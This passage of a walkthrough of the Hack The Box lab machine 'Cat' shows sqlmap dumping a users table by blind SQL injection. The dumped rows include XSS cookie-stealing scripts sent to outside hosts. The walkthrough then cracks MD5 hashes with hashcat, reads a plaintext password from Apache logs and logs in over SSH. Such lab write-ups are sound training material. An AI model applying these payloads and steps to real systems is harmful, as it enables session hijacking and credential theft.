/?c=PHPSESSID%3Dq49pk8trhp798t9ji2uguotki7 HTTP/1.1&quot; 200 -</span><br><span class="line">2025-02-05 23:32:23,678 - INFO - [+] Captured Admin PHPSESSID: q49pk8trhp798t9ji2uguotki7</span><br><span class="line">2025-02-05 23:32:23,740 - INFO - [*] Running SQLMap with Admin PHPSESSID: q49pk8trhp798t9ji2uguotki7</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.8.11#stable&#125;</span><br><span class="line">|_ -| . [(]     | .&#x27;| . |</span><br><span class="line">|___|_  [,]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 23:32:23 /2025-02-05/</span><br><span class="line"></span><br><span class="line">[23:32:23] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: catName (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: catId=2077&amp;catName=Tom&#x27;||(SELECT CHAR(90,69,99,118) WHERE 3530=3530 AND 8901=8901)||&#x27;</span><br><span class="line">---</span><br><span class="line">[23:32:24] [INFO] testing SQLite</span><br><span class="line">[23:32:24] [INFO] confirming SQLite</span><br><span class="line">[23:32:24] [INFO] actively fingerprinting SQLite</span><br><span class="line">[23:32:24] [INFO] the back-end DBMS is SQLite</span><br><span class="line">web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)</span><br><span class="line">web application technology: Apache 2.4.41</span><br><span class="line">back-end DBMS: SQLite</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 159</span><br><span class="line">[23:32:24] [INFO] resumed: CREATE TABLE users (\n    user_id INTEGER PRIMARY KEY,\n    username VARCHAR(255) NOT NULL,\n    email VARCHAR(255) NOT NULL,\n    password VARCHAR(255) NOT NULL\n)</span><br><span class="line">[23:32:24] [INFO] fetching entries for table &#x27;users&#x27;</span><br><span class="line">[23:32:24] [INFO] fetching number of entries for table &#x27;users&#x27; in database &#x27;SQLite_masterdb&#x27;</span><br><span class="line">[23:32:24] [INFO] resumed: 13</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 18</span><br><span class="line">[23:32:24] [INFO] resumed: axel2017@gmail.com</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 32</span><br><span class="line">[23:32:24] [INFO] resumed: d1bbba3670feb9435c9841e46e60ee2f</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 1</span><br><span class="line">[23:32:24] [INFO] resumed: 1</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 4</span><br><span class="line">[23:32:24] [INFO] resumed: axel</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 24</span><br><span class="line">[23:32:24] [INFO] resumed: rosamendoza485@gmail.com</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 32</span><br><span class="line">[23:32:24] [INFO] resumed: ac369922d560f17d6eeb8b2c7dec498c</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 1</span><br><span class="line">[23:32:24] [INFO] resumed: 2</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 4</span><br><span class="line">[23:32:24] [INFO] resumed: rosa</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 29</span><br><span class="line">[23:32:24] [INFO] resumed: robertcervantes2000@gmail.com</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 32</span><br><span class="line">[23:32:24] [INFO] resumed: 42846631708f69c00ec0c0a8aa4a92ad</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 1</span><br><span class="line">[23:32:24] [INFO] resumed: 3</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 6</span><br><span class="line">[23:32:24] [INFO] resumed: robert</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 29</span><br><span class="line">[23:32:24] [INFO] resumed: fabiancarachure2323@gmail.com</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 32</span><br><span class="line">[23:32:24] [INFO] resumed: 39e153e825c4a3d314a0dc7f7475ddbe</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 1</span><br><span class="line">[23:32:24] [INFO] resumed: 4</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 6</span><br><span class="line">[23:32:24] [INFO] resumed: fabian</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 22</span><br><span class="line">[23:32:24] [INFO] resumed: jerrysonC343@gmail.com</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 32</span><br><span class="line">[23:32:24] [INFO] resumed: 781593e060f8d065cd7281c5ec5b4b86</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 1</span><br><span class="line">[23:32:24] [INFO] resumed: 5</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 8</span><br><span class="line">[23:32:24] [INFO] resumed: jerryson</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 20</span><br><span class="line">[23:32:24] [INFO] resumed: larryP5656@gmail.com</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 32</span><br><span class="line">[23:32:24] [INFO] resumed: 1b6dce240bbfbc0905a664ad199e18f8</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 1</span><br><span class="line">[23:32:24] [INFO] resumed: 6</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 5</span><br><span class="line">[23:32:24] [INFO] resumed: larry</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 25</span><br><span class="line">[23:32:24] [INFO] resumed: royer.royer2323@gmail.com</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 30</span><br><span class="line">[23:32:24] [INFO] resumed: c598f6b844a36fa7836fba0835f1f6</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 1</span><br><span class="line">[23:32:24] [INFO] resumed: 7</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 5</span><br><span class="line">[23:32:24] [INFO] resumed: royer</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 20</span><br><span class="line">[23:32:24] [INFO] resumed: peterCC456@gmail.com</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 32</span><br><span class="line">[23:32:24] [INFO] resumed: e41ccefa439fc454f7eadbf1f139ed8a</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 1</span><br><span class="line">[23:32:24] [INFO] resumed: 8</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 5</span><br><span class="line">[23:32:24] [INFO] resumed: peter</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 19</span><br><span class="line">[23:32:24] [INFO] resumed: angel234g@gmail.com</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 32</span><br><span class="line">[23:32:24] [INFO] resumed: 24a8ec003ac2e1b3c5953a6f95f8f565</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 1</span><br><span class="line">[23:32:24] [INFO] resumed: 9</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 5</span><br><span class="line">[23:32:24] [INFO] resumed: angel</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 20</span><br><span class="line">[23:32:24] [INFO] resumed: jobert2020@gmail.com</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 32</span><br><span class="line">[23:32:24] [INFO] resumed: 88e4dceccd48820cf77b5cf6c08698ad</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 2</span><br><span class="line">[23:32:24] [INFO] resumed: 10</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 6</span><br><span class="line">[23:32:24] [INFO] resumed: jobert</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 11</span><br><span class="line">[23:32:24] [INFO] resumed: asd@asd.asd</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 32</span><br><span class="line">[23:32:24] [INFO] resumed: 7815696ecbf1c96e6894b779456d330e</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 2</span><br><span class="line">[23:32:24] [INFO] resumed: 11</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 99</span><br><span class="line">[23:32:24] [INFO] resumed: &lt;script&gt;var i=new Image(); i.src=&quot;http://10.10.14.96:8888/?cookie=&quot;+btoa(document.cookie);&lt;/script&gt;</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 18</span><br><span class="line">[23:32:24] [INFO] resumed: sqli8210@axura.com</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 32</span><br><span class="line">[23:32:24] [INFO] resumed: e99a18c428cb38d5f260853678922e03</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 2</span><br><span class="line">[23:32:24] [INFO] resumed: 12</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 84</span><br><span class="line">[23:32:24] [INFO] resumed: &lt;script&gt;fetch(&quot;&#123;ATTACKER_SERVER&#125;/?c=&quot;+encodeURIComponent(document.cookie));&lt;/script&gt;</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 18</span><br><span class="line">[23:32:24] [INFO] resumed: sqli5430@axura.com</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 32</span><br><span class="line">[23:32:24] [INFO] resumed: e99a18c428cb38d5f260853678922e03</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 2</span><br><span class="line">[23:32:24] [INFO] resumed: 13</span><br><span class="line">[23:32:24] [INFO] retrieving the length of query output</span><br><span class="line">[23:32:24] [INFO] resumed: 86</span><br><span class="line">[23:32:24] [INFO] resumed: &lt;script&gt;fetch(&quot;http://10.10.14.119/?c=&quot;+encodeURIComponent(document.cookie));&lt;/script&gt;</span><br><span class="line">[23:32:24] [INFO] recognized possible password hashes in column &#x27;password&#x27;</span><br><span class="line">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N</span><br><span class="line">do you want to crack them via a dictionary-based attack? [Y/n/q] Y</span><br><span class="line">[23:32:24] [INFO] using hash method &#x27;md5_generic_passwd&#x27;</span><br><span class="line">[23:32:24] [INFO] resuming password &#x27;asd&#x27; for hash &#x27;7815696ecbf1c96e6894b779456d330e&#x27; for user &#x27;&lt;script&gt;var i=new Image(); i.src=&quot;http://10.10.14.96:8888/?cookie=&quot;+btoa(document.cookie);&lt;/script&gt;&#x27;</span><br><span class="line">[23:32:24] [INFO] resuming password &#x27;abc123&#x27; for hash &#x27;e99a18c428cb38d5f260853678922e03&#x27; for user &#x27;&lt;script&gt;fetch(&quot;&#123;ATTACKER_SERVER&#125;/?c=&quot;+encodeURIComponent(document.cookie));&lt;/script&gt;&#x27;</span><br><span class="line">what dictionary do you want to use?</span><br><span class="line">[1] default dictionary file &#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27; (press Enter)</span><br><span class="line">[2] custom dictionary file</span><br><span class="line">[3] file with list of dictionary files</span><br><span class="line">&gt; 1</span><br><span class="line">[23:32:24] [INFO] using default dictionary</span><br><span class="line">do you want to use common password suffixes? (slow!) [y/N] N</span><br><span class="line">[23:32:24] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span><br><span class="line">[23:32:24] [INFO] starting 12 processes</span><br><span class="line">Database: &lt;current&gt;</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+---------+-------------------------------+-------------------------------------------+-----------------------------------------------------------------------------------------------------+</span><br><span class="line">| user_id | email                         | password                                  | username                                                                                            |</span><br><span class="line">+---------+-------------------------------+-------------------------------------------+-----------------------------------------------------------------------------------------------------+</span><br><span class="line">| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f          | axel                                                                                                |</span><br><span class="line">| 2       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c          | rosa                                                                                                |</span><br><span class="line">| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad          | robert                                                                                              |</span><br><span class="line">| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe          | fabian                                                                                              |</span><br><span class="line">| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86          | jerryson                                                                                            |</span><br><span class="line">| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8          | larry                                                                                               |</span><br><span class="line">| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6            | royer                                                                                               |</span><br><span class="line">| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a          | peter                                                                                               |</span><br><span class="line">| 9       | angel234g@gmail.com           | 24a8ec003ac2e1b3c5953a6f95f8f565          | angel                                                                                               |</span><br><span class="line">| 10      | jobert2020@gmail.com          | 88e4dceccd48820cf77b5cf6c08698ad          | jobert                                                                                              |</span><br><span class="line">+---------+-------------------------------+-------------------------------------------+-----------------------------------------------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">[23:32:28] [INFO] table &#x27;SQLite_masterdb.users&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/cat.htb/dump/SQLite_masterdb/users.csv&#x27;</span><br><span class="line">[23:32:28] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/cat.htb&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 23:32:28 /2025-02-05/</span><br></pre></td></tr></table></figure></div>
+
+<p>Export the table into <code>user.txt</code> and use <code>awk</code> to print only the password out</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/htb/machines/cat~10.10.11.53$ <span class="built_in">cat</span> user.txt | awk <span class="string">&#x27;&#123;print $4&#125;&#x27;</span></span><br><span class="line">password</span><br><span class="line"></span><br><span class="line">d1bbba3670feb9435c9841e46e60ee2f</span><br><span class="line">ac369922d560f17d6eeb8b2c7dec498c</span><br><span class="line">42846631708f69c00ec0c0a8aa4a92ad</span><br><span class="line">39e153e825c4a3d314a0dc7f7475ddbe</span><br><span class="line">781593e060f8d065cd7281c5ec5b4b86</span><br><span class="line">1b6dce240bbfbc0905a664ad199e18f8</span><br><span class="line">c598f6b844a36fa7836fba0835f1f6</span><br><span class="line">e41ccefa439fc454f7eadbf1f139ed8a</span><br><span class="line">24a8ec003ac2e1b3c5953a6f95f8f565</span><br><span class="line">88e4dceccd48820cf77b5cf6c08698ad</span><br></pre></td></tr></table></figure></div>
+
+<p>Use hashcat to crack it and retrieve the password for user <code>rosa</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/htb/machines/cat~10.10.11.53$ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line">... more above ...</span><br><span class="line">ac369922d560f17d6eeb8b2c7dec498c:soyunaprincesarosa</span><br><span class="line">... more below ...</span><br></pre></td></tr></table></figure></div>
+
+<p>Use the cracked password to SSH into user <code>rosa</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rosa@<span class="built_in">cat</span>:~$ <span class="built_in">id</span></span><br><span class="line">uid=1001(rosa) gid=1001(rosa) <span class="built_in">groups</span>=1001(rosa),4(adm)</span><br></pre></td></tr></table></figure></div>
+<p>Group <code>adm</code> typically has read access to system logs <code>/var/log</code>, can be useful for privilege escalation due to logs can contain confidential information or credentials.</p>
+<p>Checking for files that can be access by group <code>adm</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rosa@<span class="built_in">cat</span>:~$ <span class="built_in">ls</span> -la /var/log | grep <span class="string">&#x27;adm&#x27;</span></span><br><span class="line">drwxr-x---   2 root      adm                4096 Feb  5 12:33 apache2</span><br><span class="line">drwxr-x---   2 root      adm                4096 Feb  5 15:36 audit</span><br><span class="line">-rw-r-----   1 syslog    adm               57780 Feb  5 15:37 auth.log</span><br><span class="line">-rw-r-----   1 syslog    adm               19344 Jan 30 15:33 auth.log.1</span><br><span class="line">-rw-r-----   1 syslog    adm                   1 Jan 21 13:02 cloud-init.log</span><br><span class="line">-rw-r-----   1 root      adm              282216 Dec 31 12:27 cloud-init-output.log</span><br><span class="line">-rw-r--r--   1 root      adm                   0 Jan 21 13:01 dmesg</span><br><span class="line">drwxr-x---   3 root      adm                4096 Jun  3  2024 installer</span><br><span class="line">-rw-r-----   1 syslog    adm              656875 Feb  5 15:02 kern.log</span><br><span class="line">-rw-r-----   1 syslog    adm             1051746 Jan 30 15:33 kern.log.1</span><br><span class="line">-rw-r-----   1 syslog    adm               67923 Feb  5 15:36 mail.log</span><br><span class="line">-rw-r-----   1 syslog    adm                4565 Jan 27 16:05 mail.log.1</span><br><span class="line">-rw-r-----   1 syslog    adm              402976 Feb  5 15:38 syslog</span><br><span class="line">-rw-r-----   1 syslog    adm              256550 Feb  5 12:33 syslog.1</span><br><span class="line">-rw-r-----   1 syslog    adm              131116 Jan 31 11:17 syslog.2.gz</span><br></pre></td></tr></table></figure></div>
+
+<p>Using <code>find</code> + <code>xargs</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rosa@<span class="built_in">cat</span>:~$ find /var/log/ -group adm 2&gt;/dev/null | xargs grep -ir <span class="string">&#x27;password&#x27;</span></span><br><span class="line">... more above ...</span><br><span class="line">/var/log/apache2/access.log:127.0.0.1 - - [05/Feb/2025:12:33:29 +0000] <span class="string">&quot;GET /join.php?loginUsername=axel&amp;loginPassword=aNdZwgC4tI9gnVXv_e3Q&amp;loginForm=Login HTTP/1.1&quot;</span> 302 329 <span class="string">&quot;http://cat.htb/join.php&quot;</span> <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0&quot;</span></span><br><span class="line">... more below ...</span><br></pre></td></tr></table></figure></div>
+<p>notice there are a lot of credentials scattered around and repeating passwords for user <code>axel</code></p>
+<p>Using the same password in the log, SSH into user <code>axel</code> and get user.txt</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/htb/machines/cat~10.10.11.53$ ssh axel@<span class="variable">$ip</span></span><br><span class="line">axel@10.10.11.53<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/pro</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> System information as of Wed 05 Feb 2025 04:48:19 PM UTC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:           0.35</span></span><br><span class="line"><span class="string">  Usage of /:            55.9% of 6.06GB</span></span><br><span class="line"><span class="string">  Memory usage:          26%</span></span><br><span class="line"><span class="string">  Swap usage:            0%</span></span><br><span class="line"><span class="string">  Processes:             368</span></span><br><span class="line"><span class="string">  Users logged in:       1</span></span><br><span class="line"><span class="string">  IPv4 address for eth0: 10.10.11.53</span></span><br><span class="line"><span class="string">  IPv6 address for eth0: dead:beef::250:56ff:feb9:53c2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  =&gt; There is 1 zombie process.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Expanded Security Maintenance for Applications is not enabled.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0 updates can be applied immediately.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enable ESM Apps to receive additional future security updates.</span></span><br><span class="line"><span class="string">See https://ubuntu.com/esm or run: sudo pro status</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The list of available updates is more than a week old.</span></span><br><span class="line"><span class="string">To check for new updates run: sudo apt update</span></span><br><span class="line"><span class="string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You have mail.</span></span><br><span class="line"><span class="string">Last login: Wed Feb  5 16:46:12 2025 from 10.10.14.109</span></span><br><span class="line"><span class="string">axel@cat:~$ ls</span></span><br><span class="line"><span class="string">usernamexss  user.txt</span></span><br><span class="line"><span class="string">axel@cat:~$ cat user.txt</span></span><br><span class="line"><span class="string">3e99d1af8c72d984a8aa5096fb69d780</span></span><br></pre></td></tr></table></figure></div>
+<p>Notice there’s something interesting: <code>You have mail.</code></p>
+<p>Check for mailbox at <code>/var/mail</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">axel@<span class="built_in">cat</span>:~$ <span class="built_in">ls</span> -la /var/mail/</span><br><span class="line">total 100</span><br><span class="line">drwxrwsrwt  2 root   mail  4096 Feb  5 16:50 .</span><br><span class="line">drwxr-xr-x 13 root   root  4096 Jun  6  2024 ..</span><br><span class="line">-rw-rw----  1 axel   mail  1961 Jan 14 16:49 axel</span><br><span class="line">-rw-rw-r--  1 axel   mail    60 Feb  5 16:14 email.txt</span><br><span class="line">-rw-rw----  1 jobert mail     0 Feb  5 16:49 jobert</span><br><span class="line">-rw-------  1 root   mail 78817 Feb  5 16:50 root</span><br></pre></td></tr></table></figure></div>
+
+<p><code>/var/mail/axel</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">axel@<span class="built_in">cat</span>:~$ <span class="built_in">cat</span> /var/mail/axel</span><br><span class="line">From rosa@cat.htb  Sat Sep 28 04:51:50 2024</span><br><span class="line">Return-Path: &lt;rosa@cat.htb&gt;</span><br><span class="line">Received: from cat.htb (localhost [127.0.0.1])</span><br><span class="line">        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP <span class="built_in">id</span> 48S4pnXk001592</span><br><span class="line">        <span class="keyword">for</span> &lt;axel@cat.htb&gt;; Sat, 28 Sep 2024 04:51:50 GMT</span><br><span class="line">Received: (from rosa@localhost)</span><br><span class="line">        by cat.htb (8.15.2/8.15.2/Submit) <span class="built_in">id</span> 48S4pnlT001591</span><br><span class="line">        <span class="keyword">for</span> axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT</span><br><span class="line">Date: Sat, 28 Sep 2024 04:51:49 GMT</span><br><span class="line">From: rosa@cat.htb</span><br><span class="line">Message-Id: &lt;202409280451.48S4pnlT001591@cat.htb&gt;</span><br><span class="line">Subject: New <span class="built_in">cat</span> services</span><br><span class="line"></span><br><span class="line">Hi Axel,</span><br><span class="line"></span><br><span class="line">We are planning to launch new cat-related web services, including a <span class="built_in">cat</span> care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check <span class="keyword">if</span> it is a promising service that we can develop.</span><br><span class="line"></span><br><span class="line">Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.</span><br><span class="line"></span><br><span class="line">From rosa@cat.htb  Sat Sep 28 05:05:28 2024</span><br><span class="line">Return-Path: &lt;rosa@cat.htb&gt;</span><br><span class="line">Received: from cat.htb (localhost [127.0.0.1])</span><br><span class="line">        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP <span class="built_in">id</span> 48S55SRY002268</span><br><span class="line">        <span class="keyword">for</span> &lt;axel@cat.htb&gt;; Sat, 28 Sep 2024 05:05:28 GMT</span><br><span class="line">Received: (from rosa@localhost)</span><br><span class="line">        by cat.htb (8.15.2/8.15.2/Submit) <span 